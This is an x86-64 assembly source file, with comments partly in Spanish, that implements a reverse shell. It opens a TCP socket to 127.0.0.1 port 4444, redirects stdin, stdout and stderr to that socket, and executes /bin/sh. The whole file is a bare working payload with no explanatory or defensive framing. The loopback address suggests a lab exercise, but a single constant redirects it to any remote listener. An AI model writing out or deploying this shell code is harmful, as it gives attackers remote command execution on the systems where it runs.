BITS 64

section .data
    sockaddr_struct_init:
        dw 0x2                    
        dw 0x5c11                 ; sin_port (4444, 0x115c en little endian)
        dd 0x100007f              ; sin_addr (127.0.0.1 en hex, little endian)

    binsh db "/bin/sh", 0         
section .text
    global _start

_start:
    ; Create socket
    mov rax, 41                   
    mov rdi, 0x2                  
    mov rsi, 0x1                  
    mov rdx, 0x6                  
    syscall
    push rax                     
    jmp _connect_to_socket

_connect_to_socket:
    ; Connect to socket
    mov rax, 42                
    pop rdi                      
    push rdi                      
    mov rsi, sockaddr_struct_init 
    mov rdx, 0x10                 
    syscall
    jmp _duplicate_file_descriptor_stdin

_duplicate_file_descriptor_stdin:
    ; Duplicate socket descriptor to stdin
    mov rax, 33                   
    pop rdi                      
    push rdi                     
    mov rsi, 0                  
    syscall
    jmp _duplicate_file_descriptor_stdout

_duplicate_file_descriptor_stdout:
    ; Duplicate socket descriptor to stdout
    mov rax, 33                  
    pop rdi                       
    push rdi                     
    mov rsi, 1                   
    syscall
    jmp _duplicate_file_descriptor_stderr

_duplicate_file_descriptor_stderr:
    ; Duplicate socket descriptor to stderr
    mov rax, 33                  
    pop rdi                     
    push rdi                      
    mov rsi, 2                   
    syscall
    jmp _spawn_shell

_spawn_shell:
    ; Spawn shell
    mov rax, 59                   
    mov rdi, binsh               
    xor rsi, rsi                 
    xor rdx, rdx                 
    syscall